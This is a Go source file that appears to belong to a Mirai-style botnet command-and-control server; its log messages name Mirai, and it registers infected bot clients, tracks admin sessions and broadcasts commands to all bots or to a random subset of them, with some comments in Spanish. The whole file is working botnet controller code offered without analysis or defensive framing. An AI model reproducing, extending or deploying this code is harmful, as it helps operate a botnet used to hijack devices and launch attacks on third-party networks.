package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"sort"
	"sync"
	"time"
)

var (
	Clients map[int]*Client = make(map[int]*Client)
	mutex   sync.Mutex

	// Sessions holds the list of all open sessions. (ADMIN)
	Sessions map[int64]*Session = make(map[int64]*Session)
)

// Session is used for holding information about sessions
type Session struct {
	User    *User
	Opened  time.Time
	Conn    net.Conn
	History []string
}

// AddClient adds the client into the list of clients.
func AddClient(client *Client) {
	mutex.Lock()
	defer mutex.Unlock()
	defer fmt.Printf("Mirai - Joined (%s, %s)\r\n", client.Conn.RemoteAddr().String(), client.Source)

	var cid int = 0
	if len(Clients) > 0 {
		cid = -1

		var keys []int = make([]int, len(Clients))
		for item := range Clients {
			keys = append(keys, item)
		}

		sort.Ints(keys)
		for pos := 0; pos < keys[len(keys)-1]; pos++ {
			if _, ok := Clients[pos]; ok {
				continue
			}

			cid = pos
			break
		}

		// Still not found an id
		if cid == -1 {
			cid = len(keys)
		}
	}

	client.CID = cid
	Clients[client.CID] = client
}

// RemoveClient removes the client from the list of clients.
func RemoveClient(client *Client) {
	mutex.Lock()
	defer mutex.Unlock()
	delete(Clients, client.CID)
	fmt.Printf("Mirai - Left (%s, %s)\r\n", client.Conn.RemoteAddr().String(), client.Source)
}

// BroadcastClientsFraction envía el comando solo a `max` clientes seleccionados aleatoriamente.
func BroadcastClientsFraction(p []byte, max int) {
	if max <= 0 {
		return
	}
	mutex.Lock()
	// Copiar todos los clientes a un slice
	all := make([]*Client, 0, len(Clients))
	for _, c := range Clients {
		all = append(all, c)
	}
	mutex.Unlock()

	if len(all) <= max {
		// Si hay menos o igual, enviar a todos
		for _, c := range all {
			c.Stream <- p
		}
		return
	}

	// Mezclar el slice (Fisher-Yates) para selección aleatoria
	rand.Shuffle(len(all), func(i, j int) {
		all[i], all[j] = all[j], all[i]
	})
	// Enviar solo a los primeros 'max'
	for i := 0; i < max; i++ {
		all[i].Stream <- p
	}
}

// BroadcastClients will send the command to all clients.
func BroadcastClients(p []byte) {
	for _, client := range Clients {
		client.Stream <- p
	}
}

// NewSession creates a new session structure
func NewSession(conn net.Conn, user *User) *Session {
	var session *Session = &Session{
		User: user, Conn: conn, Opened: time.Now(), History: make([]string, 0),
	}

	mutex.Lock()
	defer mutex.Unlock()
	Sessions[session.Opened.Unix()] = session
	log.Printf("Mirai - new session has been created from %s and logged in as %s\r\n", session.Conn.RemoteAddr().String(), session.User.Username)
	return session
}

// SortClients will sort the clients by source
func SortClients(m map[string]int) map[string]int {
	for _, device := range Clients {
		if _, ok := m[device.Source]; ok {
			m[device.Source]++
			continue
		}

		m[device.Source] = 1
	}

	return m
}
